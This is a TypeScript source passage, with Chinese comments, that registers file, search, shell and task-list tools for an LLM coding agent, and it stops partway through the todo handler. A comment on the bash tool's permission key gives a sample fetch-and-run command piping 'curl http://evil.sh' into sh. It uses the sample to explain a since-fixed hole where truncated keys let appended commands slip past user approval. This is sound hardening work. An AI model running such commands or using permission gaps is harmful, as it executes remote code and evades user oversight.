/**
 * 内置工具注册 —— Ls / Read / Write / Edit / Grep / Bash 六个核心工具。
 * 调用方：main.ts（组装工具子系统时调用）
 * 服务于：为 LLM 提供列目录、读文件、写文件、精准改片段、搜索内容、执行命令的能力
 *         （Ls 支撑"工具增强推理"：模型先看清项目结构再动手，不凭记忆脑补）
 *
 * 设计原则：
 * 1. 参数名只认规范名，不搞多别名（结构化 function calling 由 API 保证参数格式）
 * 2. 每个参数有明确的类型约束和示例值
 * 3. 输出格式统一为 `[状态标识] 描述\n详情`——前缀由 spec.ts 的构造器（toolOk/toolInvalid/
 *    toolError/toolVerifyFailed/toolNegative）统一生成并携带机器可读的 status，
 *    handler 只写正文（结构化返回值，2026-09-12 起）
 * 4. 输入参数做运行时校验，非法参数不执行
 * 5. 改类工具拿不准时**拒绝且一字不落盘**，把原因回给模型让它重试：
 *    静默改错地方比拒绝一次的代价大得多（edit 的 0 命中与多命中两条拒绝路径即此原则）
 */
import type { ToolProvider } from '../core/tools.js';
import {
  defineTool, str, strAllowEmpty, optStr, optPosInt, optBool, ToolInputError,
  toolOk, toolInvalid, toolError, toolVerifyFailed, toolNegative,
} from './spec.js';
import { TASK_HISTORY_FILE, TaskStore, taskStore } from '../todo/store.js';

/* ═══════════════════════════════════════════════════════════════════════════════
   参数规则在每个工具的 spec 里，Schema 与校验都由它派生（实现见 spec.ts）

   改前这里有 4 个校验件（requireString / requireStringAllowEmpty / optionalString /
   optionalPositiveInt）、共 14 处调用，与下面 6 份 parameters 是**同一套规则的两份手写副本**，
   纽带只有"人手把同一个词打了多遍"（grep 的 pattern 在一个工具里出现 7 次）。现在：
     · 字段名只在 spec 里写一遍，Schema 的 properties / required 由 toJsonSchema 派生
     · 校验由 registry.execute 在 handler **之前**跑 parseSpec，handler 里不再逐个取参
     · handler 的入参类型由 Infer<typeof spec> 推出，args.pattern 直接就是 string

   两个刻意保留的形状（不是遗漏）：
   1. permissionKey / permissionDetail 仍拿**未经校验的原始 args**——权限确认发生在
      agent-loop 调 execute 之前，那时还没跑 parse。所以 edit 的 permissionDetail 里那句
      String(args.replaceAll) 消不掉（verify-spec 5-5 因此期望 1 而不是 0）。
   2. 6 个 handler 的 catch 仍保留 instanceof ToolInputError 分支。parse 已经移到 execute
      里、跑在 handler 之前，正常不会命中；留着是为了保住"handler 体内自己抛出的参数错误
      也算 [INVALID]"这条分类不变量（代价：6 行实际不走的分支，以及为它保留的 import）。
   ═══════════════════════════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════════════════════════
   子进程输出解码 与 glob 编译
   ═══════════════════════════════════════════════════════════════════════════════ */

/**
 * 把子进程的输出字节解成字符串。
 *
 * 为什么不能硬编码一种编码（改前硬编码 GBK，实测两处失真）：进程之间传的是**字节**，
 * 字节不带"我是谁的编码"这个属性，而**谁产生的输出决定编码**——
 *   · cmd.exe 内建命令（echo / dir / type / chcp）走控制台代码页，中文 Windows = 936(GBK)
 *     实测 `echo 中文测试` → d6d0cec4b2e2cad4
 *   · 外部程序（node / npm / git / tsc）走自己的编码，通常 UTF-8
 *     实测 `node -e "console.log('中文测试')"` → e4b8ade69687e6b58be8af95
 * 硬编码 GBK 时后者全变乱码：模型跑 `node -e "console.log('编译通过')"` 看到的是
 * "缂栬瘧閫氳繃"，而它正是靠这段文本判断编译结果的。
 *
 * 策略：先按 UTF-8 **严格**解（fatal: true）——解得通就是 UTF-8（纯 ASCII 是两者的公共
 * 子集，怎么解都一样）；解不通说明含非 UTF-8 字节，退回平台代码页。GBK 的中文字节序列
 * （如 d6d0）在 UTF-8 下必然非法（双字节前导后必须跟 10xxxxxx，而 d0 不是），所以这个
 * 探测在实践中是可靠的判别，不是碰运气。
 *
 * 残留限制（不装糊涂，写明）：一条命令同时混两种编码时（如 `echo x && node y`），GBK
 * 字节会让 UTF-8 严格解失败，于是整段按 GBK 解，node 那部分仍乱码。逐段判编码要先按行
 * 切字节再分别试解，代价是可能把一行 UTF-8 中文误判成 GBK（GBK 字符集覆盖面大，几乎所有
 * 双字节组合都"合法"）。当前策略在"单一来源输出"（绝大多数情况）上是对的。
 */
function decodeChildOutput(raw: Buffer): string {
  try {
    return new TextDecoder('utf-8', { fatal: true }).decode(raw);
  } catch {
    // 回退解码器本身也可能不可用（Node 未带 full-icu 时 'gbk' 构造抛 RangeError）。
    // 这种情况绝不能让它冒到 handler 的 catch 里——那会被报成 [ERROR] 命令执行失败，
    // 模型会去排查一个根本没坏的执行环境（改前正是这条路）。
    try {
      return new TextDecoder(process.platform === 'win32' ? 'gbk' : 'utf-8', { fatal: false }).decode(raw);
    } catch {
      return raw.toString('utf-8');
    }
  }
}

/** 展开 glob 里的 {a,b}，支持多组嵌套（递归） */
function expandBraces(glob: string): string[] {
  const m = glob.match(/\{([^{}]*)\}/);
  if (!m || m.index === undefined) return [glob];
  const out: string[] = [];
  for (const part of m[1].split(',')) {
    out.push(...expandBraces(glob.slice(0, m.index) + part.trim() + glob.slice(m.index + m[0].length)));
  }
  return out;
}

/**
 * 把 include 的 glob 编译成正则。只支持 * ? {} 三种——够用，且不至于自己写出半个 shell。
 * 编译失败返回 null，由调用方报 [INVALID]：**不能静默当成"不过滤"**，那会把
 * "只搜 .ts"变成"搜全部"，返回一堆无关命中而模型看不出过滤没生效。
 */
function globToRegExp(glob: string): RegExp | null {
  const parts = expandBraces(glob);
  // 未闭合的 { （如 "*.{ts,"）在 JS 正则里会被当成字面量静默通过（Annex B 宽容），
  // 编译不报错却匹配不到任何文件。这种"过滤掉一切"比"不过滤"更难发现：
  // 模型只看到 [NO_MATCH] 无匹配，不会意识到是自己的 include 写错了。所以显式判掉
  if (parts.some((p) => /[{}]/.test(p))) return null;
  try {
    const body = parts
      // 顺序承重：先转义正则元字符，再把 * ? 换成字符类。
      // 反过来做的话，[^/] 里的 ^ [ ] 会被自己的转义步骤再转一遍
      .map((g) => g
        .replace(/[.+^$()|[\]\\]/g, '\\$&')
        .replace(/\*/g, '[^/]*')
        .replace(/\?/g, '[^/]'))
      .join('|');
    return new RegExp(`^(?:${body})$`);
  } catch {
    return null;
  }
}

/* ═══════════════════════════════════════════════════════════════════════════════
   工具注册
   ═══════════════════════════════════════════════════════════════════════════════ */

/**
 * 注册 7 个内置工具（Ls / Read / Write / Edit / Grep / Bash / Todo）。
 * @param tools 工具子系统
 * @param store 任务清单真相源；缺省用进程级单例（runtime 也读同一个），测试可注入自己的实例。
 */
export function registerBuiltinTools(tools: ToolProvider, store: TaskStore = taskStore): void {
  /* ── Ls：列目录（了解结构，工具增强推理的起点） ── */
  tools.register(defineTool({
    name: 'ls',
    description: '列出目录内容，了解项目/目录结构（动手前先看清结构）。目录项以 / 结尾。默认只列当前层，depth 可递归。跳过 .git/node_modules/dist 等噪音目录。',
    spec: {
      path: optStr('目录路径', '目录路径，默认当前目录。示例: "src/" 或 "C:/Users/name/project"', '.'),
      depth: optPosInt('递归深度', '递归深度（1=仅当前层）。默认 1。示例: 2 列出两层', 1),
    },
    handler: async (args) => {
      try {
        const { path, depth } = args;

        const { existsSync, statSync, readdirSync } = await import('node:fs');
        const resolvedPath = path.replace(/\\/g, '/');

        if (!existsSync(resolvedPath)) {
          return toolNegative('NOT_FOUND', `目录不存在: ${resolvedPath}`);
        }
        if (!statSync(resolvedPath).isDirectory()) {
          return toolNegative('NOT_DIR', `不是目录: ${resolvedPath}`);
        }

        // 递归列目录（目录名带 / 后缀；跳过噪音目录；限制条目数防膨胀）
        const SKIP = new Set(['.git', 'node_modules', 'dist']);
        const MAX_ENTRIES = 200;
        const lines: string[] = [];
        const walk = (dir: string, level: number): void => {
          if (level > depth || lines.length >= MAX_ENTRIES) return;
          let items;
          try {
            items = readdirSync(dir, { withFileTypes: true });
          } catch {
            return; // 无权限等 → 跳过该目录
          }
          items.sort((a, b) => {
            if (a.isDirectory() !== b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.name.localeCompare(b.name);
          });
          for (const item of items) {
            if (lines.length >= MAX_ENTRIES) return;
            if (item.name.startsWith('.') || SKIP.has(item.name)) continue;
            const prefix = '  '.repeat(level - 1);
            const isDir = item.isDirectory();
            lines.push(`${prefix}- ${item.name}${isDir ? '/' : ''}`);
            if (isDir) walk(`${dir}/${item.name}`, level + 1);
          }
        };
        walk(resolvedPath, 1);

        if (lines.length === 0) {
          return toolNegative('EMPTY', `目录为空或全部被过滤: ${resolvedPath}`);
        }
        const count = lines.length;
        return toolOk(`目录 ${resolvedPath} (${count} 项${count >= MAX_ENTRIES ? ', 已达上限截断' : ''}):\n${lines.join('\n')}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`列目录失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Read：读文件 ── */
  tools.register(defineTool({
    name: 'read',
    description: '读取文件内容。可指定行范围分段读取大文件。路径用 / 或 \\\\，如 "C:/Users/name/file.txt" 或 "src/utils/helper.ts"。',
    spec: {
      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/file.txt" 或 "src/data/config.json"'),
      offset: optPosInt('起始行号', '起始行号，从 1 开始。默认 1。示例: 10 （从第 10 行开始读）', 1),
      limit: optPosInt('读取行数', '读取行数。默认不限制。示例: 50 （最多读 50 行）', Number.MAX_SAFE_INTEGER),
    },
    handler: async (args) => {
      try {
        const { path, offset, limit } = args;

        const { readFileSync, existsSync, statSync } = await import('node:fs');
        const resolvedPath = path.replace(/\\/g, '/');

        if (!existsSync(resolvedPath)) {
          return toolNegative('NOT_FOUND', `文件不存在: ${resolvedPath}`);
        }
        if (!statSync(resolvedPath).isFile()) {
          return toolNegative('NOT_FILE', `不是文件: ${resolvedPath}`);
        }

        const content = readFileSync(resolvedPath, 'utf-8');
        const lines = content.split('\n');
        const start = Math.max(0, offset - 1);
        const count = Math.min(limit, lines.length - start);
        const selected = lines.slice(start, start + count);
        const output = selected.map((line, i) => `${start + i + 1} | ${line}`).join('\n');

        return toolOk(`文件 ${resolvedPath} (${lines.length} 行) 行 ${offset}-${offset + count - 1}:\n${output}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`读取失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Write：写文件 ── */
  tools.register(defineTool({
    name: 'write',
    description: '创建新文件或整篇覆盖已有文件的内容。自动创建不存在的父目录。只改文件里的一小段请用 edit（不必重抄全文，也不会误伤未改动的部分）。路径用 / 或 \\\\。',
    requirePermission: true,
    spec: {
      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "C:/Users/name/output.txt" 或 "src/data/config.json"'),
      content: str('文件内容', '要写入的文件完整内容。会完全覆盖已存在的文件。示例: "{\\n  \\"name\\": \\"test\\"\\n}"'),
    },
    // 授权边界 = 目标文件。刻意不含 content：内容每次都不同，塞进键里会让"本次全部允许"
    // 退化成"只允许这一次"。反斜杠归一，免得 `src\x.ts` 与 `src/x.ts` 算成两个键。
    permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
    handler: async (args) => {
      try {
        const { path, content } = args;

        const { writeFileSync, readFileSync, mkdirSync, existsSync } = await import('node:fs');
        const { dirname } = await import('node:path');
        const resolvedPath = path.replace(/\\/g, '/');
        const dir = dirname(resolvedPath);

        if (!existsSync(dir)) {
          mkdirSync(dir, { recursive: true });
        }

        writeFileSync(resolvedPath, content, 'utf-8');

        // 写回验证
        const verified = readFileSync(resolvedPath, 'utf-8');
        if (verified !== content) {
          return toolVerifyFailed(`写入内容与读取内容不一致: ${resolvedPath}`);
        }

        const lineCount = content.split('\n').length;
        return toolOk(`写入成功: ${resolvedPath} (${content.length} 字符, ${lineCount} 行)`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`写入失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Edit：精准替换文件片段（改局部用它，不要 write 重抄全文） ── */
  tools.register(defineTool({
    name: 'edit',
    description: '精准替换文件中的一段文本，用于局部修改（改一行、改一个函数、改一处配置）。oldText 必须与文件里的原文逐字符一致（缩进、空格、标点全算）且在文件中唯一；找不到或命中多处时本工具会拒绝并回报原因，文件一字不动。新建文件或整篇重写才用 write。路径用 / 或 \\\\。',
    requirePermission: true,
    spec: {
      path: str('文件路径', '文件路径，绝对路径或相对当前工作目录。示例: "src/tools/builtin.ts"'),
      oldText: str('原文片段', '要被替换的原文片段，逐字符照抄文件里的内容（缩进与空格全算）。不确定就先用 read 看清原文，不要凭记忆填。片段要带足够上下文以保证在文件中唯一。示例: "const count = 1;"'),
      newText: strAllowEmpty('新文本', '替换后的新文本。传空字符串表示删掉 oldText 这一段。示例: "const count = 2;"', '（删除内容请显式传空字符串）'),
      replaceAll: optBool('是否全部替换', '命中多处时是否全部替换。默认 false，即多命中直接拒绝并回报候选行号。仅在确认每一处都该改成同样内容时才传 true。示例: false', false),
    },
    // 授权边界 = 目标文件。刻意不含 oldText/newText：两段文本每次都不同，塞进键里会让
    // "本次全部允许"退化成"只允许这一次"；而只截前 N 字符更糟——那正是本轮修掉的静默扩权
    // （同一文件里 oldText 开头相同的两次调用会共用一次授权，newText 改成什么都放行）。
    permissionKey: (args) => String(args.path ?? '').replace(/\\/g, '/'),
    // 弹窗文案自定义（core ToolDefinition 的可选成员）：默认的 args JSON 前 80 字符会被
    // path 与 oldText 占满，用户在弹窗里看不出要改什么。硬约束：必须单行——selector 的标题
    // 只占 1 行、每行过 fitWidth 截断，文案里带 \n 会多出一个物理行，把"固定行数 + 回退清行"
    // 算错 → 选择器漂移。所以下面 flat() 把所有空白（含换行）压成单个空格。
    permissionDetail: (args) => {
      const target = String(args.path ?? '?').replace(/\\/g, '/');
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);
      const all = String(args.replaceAll) === 'true' ? '（全部）' : '';
      return `改 ${target}: ${clip(flat(args.oldText), 20)} → ${clip(flat(args.newText), 20)}${all}`;
    },
    handler: async (args) => {
      try {
        const { path, oldText, newText, replaceAll } = args;
        const resolvedPath = path.replace(/\\/g, '/');

        // 新旧文本相同：不落盘、不报成功，直接回一句无效（省掉无谓的写与验证）
        if (oldText === newText) {
          return toolInvalid(`oldText 与 newText 完全相同，无需改动: ${resolvedPath}`);
        }

        const { readFileSync, writeFileSync, existsSync, statSync } = await import('node:fs');

        if (!existsSync(resolvedPath)) {
          return toolNegative('NOT_FOUND', `文件不存在: ${resolvedPath}（新建文件请用 write）`);
        }
        if (!statSync(resolvedPath).isFile()) {
          return toolNegative('NOT_FILE', `不是文件: ${resolvedPath}`);
        }

        // 按字节读，不按 'utf-8' 读字符串：BOM 判定与写回验证都落在字节上。
        // 实测 Node v24.12.0 用 utf-8 读**不剥** BOM（\uFEFF 会留在串首），但这是随时可能
        // 变的行为细节，不该当设计依据——自己读字节、自己判头三字节，BOM 的保真就与 Node
        // 版本无关；写回也因此能直接按字节 equals 验证，不经二次编解码。
        const buf = readFileSync(resolvedPath);
        const hasBom = buf[0] === 0xef && buf[1] === 0xbb && buf[2] === 0xbf;
        const decoded = buf.toString('utf-8');
        const original = hasBom ? decoded.slice(1) : decoded;

        // 行尾保持：纯 CRLF 文件（Windows 上 git core.autocrlf=true 检出的源码就是这样）里，
        // 模型发来的 oldText 几乎必然用 \n，直接匹配必然 0 命中 —— 工具会在最需要它的地方失效。
        // 做法：在 \n 归一化副本上匹配与替换，写回前整体还原成 CRLF。
        // 只对"纯 CRLF"做这层往返：混合行尾的文件按字面匹配（宁可拒绝，也不做波及全文的还原）。
        const crlfCount = (original.match(/\r\n/g) ?? []).length;
        const lfCount = (original.match(/\n/g) ?? []).length;
        const allCrlf = crlfCount > 0 && crlfCount === lfCount;
        const work = allCrlf ? original.replace(/\r\n/g, '\n') : original;

        // 数命中：indexOf 循环 + 字面切片拼接，不用正则——oldText 里满是 . * ( [ ? 这类元字符，
        // 走正则就得转义，转义就有漏转的风险（漏一个就把"改这一处"变成"改一片"）。
        // 步进 oldText.length 而非 1：不重复计重叠命中，与 replaceAll 的语义一致。
        const hits: number[] = [];
        for (let i = work.indexOf(oldText); i !== -1; i = work.indexOf(oldText, i + oldText.length)) {
          hits.push(i);
        }

        // 状态的选择是**承重的**，不要"为一致性"改成 NO_MATCH / NOT_FOUND：
        // agent-loop 把 error / verify_failed / invalid 记作失败，而"重复失败保护"只在失败时计数，
        // 第 2 次同样调用就会追加 [系统提示] 叫模型停止原样重试、先去 read 确认。
        // 定位失败（0 命中 / 多命中）恰恰是最容易被原样重试的一类，用有效否定状态等于把这层保护关掉。
        // 为何不用 invalid（2026-09-05 起它也计失败，行为上已等价）：0 命中不是"参数格式不合法"，
        // 而是"文件内容与模型预期不符"——参数本身完全合法，语义上属执行失败。
        // 反之 NOT_FOUND（目标文件不存在）保持与 read/write 一致的有效否定语义。
        if (hits.length === 0) {
          return toolError(`oldText 在文件中找不到，未做任何改动: ${resolvedPath}\n`
            + `文件共 ${work.split('\n').length} 行。oldText 必须与文件内容逐字符一致（缩进、空格、标点全算）。\n`
            + `先用 read 看清原文再重试，不要凭记忆猜。`);
        }

        if (hits.length > 1 && !replaceAll) {
          // 拒绝而不是"改第一处"：猜是最危险的行为——它会静默改错地方，模型和用户都看不出来。
          const lineOf = (idx: number): number => work.slice(0, idx).split('\n').length;
          const shown = hits.slice(0, 20).map(lineOf);
          const more = hits.length > shown.length ? `（仅列出前 ${shown.length} 处）` : '';
          return toolError(`oldText 命中 ${hits.length} 处，无法确定该改哪一处，未做任何改动: ${resolvedPath}\n`
            + `候选行号: 第 ${shown.join(', ')} 行${more}\n`
            + `给 oldText 加上下文使其唯一；确认每一处都要改成同样内容时，才传 replaceAll: true。`);
        }

        const updated = replaceAll
          ? work.split(oldText).join(newText)
          : work.slice(0, hits[0]) + newText + work.slice(hits[0] + oldText.length);

        // 还原行尾与 BOM 后整体写回：未命中的部分必须与原文逐字节相同
        const payload = (hasBom ? '\uFEFF' : '') + (allCrlf ? updated.replace(/\n/g, '\r\n') : updated);
        writeFileSync(resolvedPath, payload, 'utf-8');

        // 写回验证按字节比：不依赖"编码读会不会吃 BOM"这类行为细节
        if (!readFileSync(resolvedPath).equals(Buffer.from(payload, 'utf-8'))) {
          return toolVerifyFailed(`写回内容与读取内容不一致: ${resolvedPath}`);
        }

        const before = work.split('\n').length;
        const after = updated.split('\n').length;
        const delta = after - before;
        return toolOk(`已替换 ${replaceAll ? hits.length : 1} 处: ${resolvedPath} `
          + `(${before} → ${after} 行${delta === 0 ? '' : `, ${delta > 0 ? '+' : ''}${delta}`}, `
          + `${original.length} → ${updated.length} 字符${allCrlf ? ', CRLF 已保持' : ''}${hasBom ? ', BOM 已保持' : ''})`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`替换失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Grep：搜索文件内容 ── */
  tools.register(defineTool({
    name: 'grep',
    description: '在文件中递归搜索文本或正则模式，返回"路径:行号:该行内容"。纯 Node 实现、跨平台（Windows 无需装 grep 或 rg）。跳过 .git/node_modules/dist、二进制文件与超大文件。pattern 按 JS 正则编译。',
    spec: {
      pattern: str('搜索模式', '搜索模式，支持正则表达式。特殊字符请转义。示例: "function\\s+\\w+" 或 "TODO|FIXME" 或 "console\\.log"'),
      path: optStr('搜索路径', '搜索路径，文件或目录。默认当前目录。示例: "src/" 或 "C:/Users/name/project"', '.'),
      include: optStr('过滤模式', '文件类型过滤 glob 模式。示例: "*.ts" 或 "*.{ts,js,json}" 或 "*.txt"', ''),
    },
    handler: async (args) => {
      try {
        // path / include 改名解构：handler 体内沿用的局部名是 searchPath / glob
        //（path 与下面的 resolvedPath、glob 与 globToRegExp 各自成对，改名反而读着费劲）
        const { pattern, path: searchPath, include: glob } = args;

        /* 纯 Node 遍历，不再 shell 出去。改前拼的是 `grep -rn ... 2>/dev/null | head -50`：
           POSIX 语法，而 Windows 上 execSync 走 cmd.exe —— grep 不存在、2>/dev/null 被当成
           路径，实测在中文 Windows 上任何调用都失败；更糟的是失败被报成 [NO_MATCH]，而
           agent-loop 把 NO_MATCH 归为"有效否定（不计失败）"，于是模型搜一个**确实存在**的
           符号会得到"无匹配"，据此形成对整个代码库的错误认知，且收不到任何警告。 */

        // 坏正则必须是 invalid，不能混进 NO_MATCH：那是"我写错了"与"项目里没有"的区别
        let re: RegExp;
        try {
          re = new RegExp(pattern);
        } catch (e) {
          return toolInvalid(`正则无法编译: /${pattern}/ —— ${e instanceof Error ? e.message : String(e)}`);
        }
        const includeRe = glob ? globToRegExp(glob) : null;
        if (glob && includeRe === null) return toolInvalid(`include 过滤模式无法编译: ${glob}`);

        const { existsSync, statSync, readdirSync, readFileSync } = await import('node:fs');
        const resolvedPath = searchPath.replace(/\\/g, '/');
        if (!existsSync(resolvedPath)) return toolNegative('NOT_FOUND', `路径不存在: ${resolvedPath}`);

        const SKIP_DIRS = new Set(['.git', 'node_modules', 'dist']);
        const MAX_FILE_BYTES = 2 * 1024 * 1024;   // 超大文件跳过：读进来只为搜一遍不值得
        const MAX_MATCHES = 50;                   // 与改前的 head -50 同量级，防输出膨胀
        const MAX_FILES = 5000;                   // 防误指向盘符根目录时走到天荒地老
        const PROBE_BYTES = 8192;                 // 二进制判定的探测窗口

        const hits: string[] = [];
        let scanned = 0, skippedBinary = 0, skippedBig = 0, hitCap = false;

        const scanFile = (file: string): void => {
          if (hitCap || scanned >= MAX_FILES) return;
          let buf: Buffer;
          try {
            buf = readFileSync(file);
          } catch {
            return;   // 无权限 / 占用中 → 跳过该文件，不该让整个搜索失败
          }
          if (buf.length > MAX_FILE_BYTES) { skippedBig++; return; }
          // 二进制判定：头部窗口内有 NUL 字节即视为二进制（与 ripgrep 同一思路）。
          // 不跳过的话，一个 .png 能贡献几百行乱码命中，把 50 个名额全吃光。
          // 注意 Buffer.indexOf 的第三参是 encoding 而非结束位置，限定窗口只能先 subarray
          //（subarray 越界会自动夹到长度，不必自己 Math.min）
          if (buf.subarray(0, PROBE_BYTES).indexOf(0) !== -1) { skippedBinary++; return; }
          scanned++;
          const lines = buf.toString('utf-8').split('\n');
          for (let i = 0; i < lines.length; i++) {
            const line = lines[i].endsWith('\r') ? lines[i].slice(0, -1) : lines[i];
            if (!re.test(line)) continue;
            hits.push(`${file}:${i + 1}:${line}`);
            if (hits.length >= MAX_MATCHES) { hitCap = true; return; }
          }
        };

        const walk = (dir: string): void => {
          if (hitCap || scanned >= MAX_FILES) return;
          let items;
          try {
            items = readdirSync(dir, { withFileTypes: true });
          } catch {
            return;
          }
          items.sort((a, b) => a.name.localeCompare(b.name));   // 排序让输出稳定，断言才可复现
          for (const item of items) {
            if (hitCap) return;
            if (item.name.startsWith('.') || SKIP_DIRS.has(item.name)) continue;
            const full = `${dir}/${item.name}`;
            if (item.isDirectory()) { walk(full); continue; }
            if (includeRe && !includeRe.test(item.name)) continue;
            scanFile(full);
          }
        };

        if (statSync(resolvedPath).isDirectory()) walk(resolvedPath);
        else scanFile(resolvedPath);

        // "扫了 N 个文件"必须回给模型：0 命中时它需要区分"扫了 300 个文件确实没有"
        // 与"过滤器把所有文件都排除了"——后者是它自己 include 写错了
        const stats = [
          `已扫 ${scanned} 个文件`,
          hitCap ? `命中达上限 ${MAX_MATCHES} 已停止` : '',
          skippedBinary ? `跳过 ${skippedBinary} 个二进制` : '',
          skippedBig ? `跳过 ${skippedBig} 个超大文件` : '',
        ].filter(Boolean).join('，');

        if (hits.length === 0) {
          return toolNegative('NO_MATCH', `无匹配结果: /${pattern}/ 在 ${resolvedPath}${glob ? ` (${glob})` : ''} —— ${stats}`);
        }
        const body = hits.join('\n');
        const shown = body.length > 4000
          ? `${body.slice(0, 4000)}\n...（结果截断：共 ${body.length} 字符）`
          : body;
        return toolOk(`找到 ${hits.length} 处匹配（${stats}）:\n${shown}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        // 执行失败报 error 而非 negative：前者计入失败、会触发重复失败保护，
        // 后者被当成"有效否定"悄悄放过。把两者混为一谈正是改前那个洞
        return toolError(`搜索失败: ${e instanceof Error ? e.message.slice(0, 300) : String(e)}`);
      }
    },
  }));

  /* ── Bash：执行命令 ── */
  tools.register(defineTool({
    name: 'bash',
    description: '执行 shell 命令。仅当用户明确要求执行命令/运行脚本/编译时才使用；不要为"了解环境"或"随便试试"而主动调用。命令在当前工作目录执行。注意 Windows 环境：不要用 pwd/ls/cat 等 Unix 命令（会报"不是内部或外部命令"），查看当前目录用 cd（无参数），列目录用 dir，读文件用 type。Windows 路径中的反斜杠需转义或使用正斜杠。',
    requirePermission: true,
    spec: {
      command: str('命令', '要执行的 shell 命令。多行命令用 && 连接。Windows 下路径用正斜杠或用 \\\\ 转义。示例: "node build.js" 或 "cd src && dir /b"'),
      description: optStr('用途说明', '命令用途说明（仅用于权限确认提示，不影响执行）。示例: "编译 TypeScript 项目"', ''),
    },
    // 授权边界 = 完整命令，一个字也不截。截断是本轮修掉的那个洞：批准过一条 76 字符的
    // 命令后，同一条命令再接 ` && curl http://evil.sh | sh` 曾会自动放行。
    // 代价是命令里只要有一个字符不同（多个空格也算）就会重新弹窗——这是刻意选的：
    // 命令不像文件路径有天然的"同一个东西"边界，宁可多问一次。
    permissionKey: (args) => String(args.command ?? ''),
    // description 参数的说明写着"仅用于权限确认提示"，但在有自定义文案之前它只是混在 args
    // 的 JSON 里、且命令一长就被 80 字符截掉——这个承诺一直没兑现。这里让它真的出现在弹窗上。
    // 同样受单行约束（selector 标题只占 1 行），所以下面 flat() 把所有空白压成单个空格。
    permissionDetail: (args) => {
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      const clip = (s: string, n: number): string => (s.length > n ? `${s.slice(0, n)}…` : s);
      const cmd = clip(flat(args.command), 60);
      const why = flat(args.description);
      return why ? `${why}: ${cmd}` : cmd;
    },
    handler: async (args) => {
      try {
        // description 只服务于权限弹窗（permissionDetail 拿的是原始 args），handler 不取它；
        // 但它必须在 spec 里声明，否则模型传了就会被 parse 判成未知参数
        const { command: cmd } = args;

        const { execSync } = await import('node:child_process');

        const raw = execSync(cmd, {
          encoding: 'buffer',
          timeout: 30000,
          maxBuffer: 4096 * 1024,
          windowsHide: true,
        });

        const trimmed = decodeChildOutput(raw).trim();

        if (!trimmed) {
          return toolOk(`命令执行成功（无输出）: ${cmd.slice(0, 100)}`);
        }

        // 行数与字符数都按**截断前**的原文算。改前 lineCount 取的是截断后的串，而同一句里
        // "共 N 字符"取的是截断前的数——一前一后自相矛盾，且输出一万行被截到 4000 字符时
        // 标签会显示"(50 行输出)"，模型据此以为命令只输出了 50 行
        const lineCount = trimmed.split('\n').length;
        const shown = trimmed.length > 4000
          ? `${trimmed.slice(0, 4000)}\n...（输出截断：共 ${trimmed.length} 字符、${lineCount} 行，此处只显示前 4000 字符）`
          : trimmed;

        return toolOk(`命令执行成功 (${lineCount} 行输出，${trimmed.length} 字符):\n${shown}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        const msg = e instanceof Error ? e.message.slice(0, 500) : String(e);
        return toolError(`命令执行失败: ${msg}`);
      }
    },
  }));

  /* ── Todo：维护任务清单（C 方案的"工具做接口"） ──
     真相源是注入的 TaskStore（内存结构化状态）；本工具只做**增量**变更（传 op + index + text），
     返回值就是渲染后的整份清单 —— 模型下一轮自然看到最新进度，不必自己重抄。
     每次变更后把状态**投影**到 TASK.md（系统行为，不走权限弹窗）：进程重启后由 main 读它当种子。
     刻意不做的事：不做嵌套参数（items 数组）。spec.ts 只给 5 种标量形状，且"清单本体住在工具的
     状态里"正是本设计的关键 —— 参数保持标量，状态与校验都收在 TaskStore 一处。 */
  tools.register(defineTool({
    name: 'todo',
    description: '维护任务步骤清单（长任务用，保证多步任务不断链）。op: add 追加一项（需 text）/ start 标记某项进行中 / done 标记某项完成 / clear 清空。同一时刻至多一项"进行中"。返回值是带序号的整份清单，序号即下次 start/done 要传的 index。清单会投影到 TASK.md，进程重启后仍可续。简单问答、闲聊不要用本工具。',
    spec: {
      op: str('操作', '要做的操作：add（追加一项，需 text）/ start（标记进行中，需 index）/ done（标记完成，需 index）/ clear（清空）'),
      index: optPosInt('项序号', '目标项的序号（1 基，与返回值里的编号一致），start / done 使用。缺省 1。示例: 2', 1),
      text: optStr('任务文本', 'add 时的步骤描述（单行）。示例: "改 tools/builtin.ts 并跑验证"', ''),
    },
    handler: async (args) => {
      try {
        const { op, index, text } = args;
        switch (op) {
          case 'add': {
            if (store.add(text) < 0) {
              return toolInvalid(`add 需要非空的 text（要追加的步骤描述）`);
            }
            break;
          }
          case 'start': {
            if (!store.start(index)) {
              const t = store.counts().total;
              return toolInvalid(`start 的 index=${index} 越界（当前 ${t} 项，序号 1..${t}）`);
            }
            break;
          }
          case 'done': {
            if (!store.done(index)) {
              const t = store.counts().total;
              return toolInvalid(`done 的 index=${index} 越界（当前 ${t} 项，序号 1..${t}）`);
            }
            break;
          }
          case 'clear':
            store.clear();
            break;
          default:
            return toolInvalid(`未知操作 op=${op}，可用的是 add / start / done / clear`);
        }

        // 投影到 TASK.md（失败不致命：内存仍是真相源，只是丢跨重启存档）
        const warn = store.projectToFile('TASK.md');
        // 历史归档紧跟投影：清单"全完成"的那次操作把快照追加进 TASK_HISTORY.md
        //（/tasks 回看用）。没到全完成时它是 no-op；写失败同样不致命，与投影合并提醒
        const histWarn = store.archiveToFile(TASK_HISTORY_FILE);
        const c = store.counts();
        if (c.total === 0) return toolOk(`任务清单已清空（TASK.md 已移除）`);
